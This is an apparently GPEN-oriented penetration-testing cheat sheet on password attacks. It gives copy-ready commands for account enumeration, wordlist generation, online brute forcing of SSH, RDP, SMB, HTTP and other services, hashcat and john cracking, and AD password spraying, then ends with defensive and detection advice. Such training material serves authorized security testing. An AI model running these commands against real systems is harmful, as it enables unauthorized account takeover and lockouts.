# Password Attacks & Brute Forcing

The GPEN "password attacks" phase: credential attacks across services + offline hash cracking. **Authorized engagements only.** Online brute forcing is loud and can **lock accounts / cause DoS** — confirm scope and the lockout policy before you touch a live service.

## Attack types (pick the right one)

| Type | What it does | When to use |
| --- | --- | --- |
| **Dictionary** | Try a wordlist of likely passwords | Default first pass |
| **Brute force** | Try every combination in a keyspace | Short/known charset only — slow |
| **Hybrid / mask** | Wordlist + rules, or a charset pattern (`?u?l?l?d`) | Refine after a dictionary run |
| **Password spraying** | One password across many users | AD — avoids lockout (see below) |
| **Credential stuffing** | Reuse known breached `user:pass` pairs | When you have a breach corpus for the org |

Core distinction: **online** (against a live service — slow, noisy, lockout risk) vs **offline** (against captured hashes — fast, silent, no lockout). **Prefer offline whenever you have hashes** (dumped via [secretsdump](../AD/Impacket%20Toolkit.md) or [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md)).

## Enumerate before you brute (don't attack blind)

Valid usernames + service versions + the lockout policy cut the work massively.

```bash
# Service + version detection (feeds default-cred lookups)
nmap -sV -p- <target>

# Valid AD usernames without touching passwords (no lockout)
kerbrute userenum -d <domain> --dc <dc-ip> users.txt

# SMB user/share enum + PASSWORD POLICY (find the lockout threshold first!)
nxc smb <dc-ip> -u <user> -p <pass> --users --shares --pass-pol

# SMTP username enumeration
smtp-user-enum -M VRFY -U users.txt -t <target>
```

Build target user lists from OSINT (name conventions), RID cycling ([Enumeration](../AD/Enumeration.md)), and these tools.

## Wordlists

```bash
locate rockyou.txt                       # /usr/share/wordlists/rockyou.txt
# SecLists — the standard collection (usernames, passwords, defaults)
# Custom lists:
cewl -d 2 -m 5 -w custom.txt https://<company-site>   # scrape site for words
crunch 8 8 -t Summer@%% -o crunch.txt                 # pattern-generated
# Mutate a list with rules (hashcat/john rulesets)
hashcat --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
```

## Online brute forcing by protocol

**hydra**, **medusa**, and **ncrack** are the general tools; **NetExec (nxc)** is best for SMB/WinRM/LDAP/MSSQL. `-L` = user list, `-l` = single user; `-P` = password list, `-p` = single password.

```bash
# SSH
hydra -L users.txt -P pass.txt ssh://<target>
medusa -h <target> -U users.txt -P pass.txt -M ssh

# FTP / Telnet
hydra -L users.txt -P pass.txt ftp://<target>

# RDP (ncrack handles RDP well)
ncrack -U users.txt -P pass.txt rdp://<target>
hydra -L users.txt -P pass.txt rdp://<target>

# SMB / WinRM / LDAP / MSSQL (NetExec)
nxc smb   <target> -u users.txt -p pass.txt
nxc winrm <target> -u users.txt -p pass.txt
nxc ldap  <target> -u users.txt -p pass.txt
nxc mssql <target> -u users.txt -p pass.txt

# HTTP Basic auth
hydra -L users.txt -P pass.txt <target> http-get /admin/

# HTTP login form (adjust field names + the failure string)
hydra -l admin -P pass.txt <target> http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# SNMP community strings
onesixtyone -c community.txt <target>

# Nmap NSE has per-service brute scripts as a fallback
nmap --script ssh-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

## Offline hash cracking

Fast, silent, no lockout — the preferred path once you have hashes.

```bash
# 1) Identify the hash type
hashid '<hash>'
hashcat --example-hashes | less     # match format -> mode number
```

```bash
# 2a) hashcat — dictionary, then rules, then mask
hashcat -m 1000 -a 0 hashes.txt rockyou.txt                         # NTLM, dictionary
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule          # + mutation rules
hashcat -m 1000 -a 3 hashes.txt '?u?l?l?l?l?l?d?d'                   # mask (brute a pattern)
hashcat -m 1000 -a 6 hashes.txt rockyou.txt '?d?d?d'                # hybrid: word + digits
hashcat -m 1000 hashes.txt --show                                   # show cracked
```

```bash
# 2b) john — auto-detect or forced format, plus *2john extractors
john --wordlist=rockyou.txt hashes.txt
john --format=NT --wordlist=rockyou.txt hashes.txt
ssh2john id_rsa > rsa.hash ; john rsa.hash          # crack an encrypted SSH key
zip2john secret.zip > zip.hash ; john zip.hash      # crack a protected archive
```

### Common hashcat modes (quick reference)

| Mode | Hash |
| --- | --- |
| `0` | MD5 |
| `100` | SHA1 |
| `1000` | NTLM (Windows) |
| `1800` | sha512crypt (`/etc/shadow`) |
| `3200` | bcrypt |
| `5600` | NetNTLMv2 (Responder captures) |
| `13100` | Kerberoast (RC4) — see [Kerberos Attacks](../AD/Kerberos%20Attacks.md) |
| `18200` | AS-REP roast |
| `22000` | WPA/WPA2 |

## Password spraying (the safe AD default)

Low-and-slow: one password against many users stays under the lockout threshold.

```bash
# 1) Get the lockout policy FIRST (threshold + observation window)
nxc smb <dc-ip> -u <user> -p <pass> --pass-pol

# 2) Spray one seasonal/common password, keep going past a hit
nxc smb <dc-ip> -u users.txt -p 'Autumn2024!' --continue-on-success

# 3) Kerberos spray (kerbrute) — often quieter than SMB
kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt 'Autumn2024!'
```

Rule: stay **below** the lockout threshold, wait out the observation window between rounds, and never run an unbounded password list against real accounts.

## Defense / detection (for the report)

- **Lockout policy** + **MFA** everywhere; long passphrases and a **banned-password list** (blocks `Season+Year!`).
- Disable legacy/cleartext protocols (Telnet, FTP, SMBv1); rate-limit and **fail2ban** on SSH/RDP.
- Detect: **4625** logon-failure spikes, **many users / one password** in a short window (spraying), **4771/4768** Kerberos pre-auth failures, and NetNTLMv2 capture from LLMNR/NBT-NS poisoning ([Networking Overview](Networking%20Overview.md)).
